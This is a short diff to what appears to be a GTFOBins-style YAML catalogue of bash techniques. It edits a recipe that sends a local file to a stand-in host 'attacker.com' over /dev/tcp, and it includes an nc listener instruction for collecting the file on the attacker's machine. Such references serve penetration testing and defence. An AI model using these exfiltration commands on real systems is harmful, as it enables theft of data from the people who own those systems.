@@ -12,7 +12,7 @@ functions:
         export RHOST=attacker.com
         export RPORT=12345
         export LFILE=file_to_send
-        bash -c 'echo -e "POST / HTTP/0.9\n\n$(cat $LFILE)" > /dev/tcp/$RHOST/$RPORT'
+        bash -c 'echo -e "POST / HTTP/0.9\n\n$(<$LFILE)" > /dev/tcp/$RHOST/$RPORT'
     - description: Send local file using a TCP connection. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.
       code: |
         export RHOST=attacker.com
